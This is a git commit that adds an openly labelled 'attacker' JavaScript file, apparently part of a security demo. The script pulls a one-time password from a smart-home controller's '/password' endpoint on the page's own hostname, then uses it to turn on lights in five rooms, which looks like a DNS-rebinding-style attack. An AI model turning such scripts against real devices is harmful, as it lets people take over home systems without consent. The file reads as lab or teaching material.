2234cfa80abc9001006678c14f008cbb6a391be0
0xDrogon <tiagofsdomingues@gmail.com>
2022-10-24 22:33:23 +0100

    organizes and cleans attacker's code

---
+++ attacker/app/static/js/main.js
@@ -0,0 +1,41 @@
+function attackRoom(hostname, room) {
+    var url = "http://"+hostname+"/password";
+    var http = new XMLHttpRequest();
+    http.open("GET", url, false);
+    http.onreadystatechange = function() {
+        if(http.readyState == 4 && http.status == 200) {
+            otp = JSON.parse(this.responseText).otp;
+            console.log(otp);
+            turnLightsOn(hostname, room, otp); 
+        }
+    }
+    http.send();
+}
+
+function turnLightsOn(hostname, room, otp) {
+    var url = "http://"+hostname +"/lights?room="+room+"&value=true&otp="+otp;
+    var http = new XMLHttpRequest();
+    http.open("POST", url, false);
+    http.onreadystatechange = function() {
+        if(http.readyState == 4 && http.status == 200) {
+            console.log(this.responseText);
+        }
+    }
+    http.send();
+}
+
+function sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
+}
+
+function launchAttack() {
+    var hostname = window.location.hostname;
+    console.log('Launching attack against ' + hostname);
+    sleep(1000);
+    attackRoom(hostname, "hallway");
+    attackRoom(hostname, "kitchen");
+    attackRoom(hostname, "bedroom");
+    attackRoom(hostname, "livingroom");
+    attackRoom(hostname, "bathroom");
+    console.log('Attack finished!');
+}
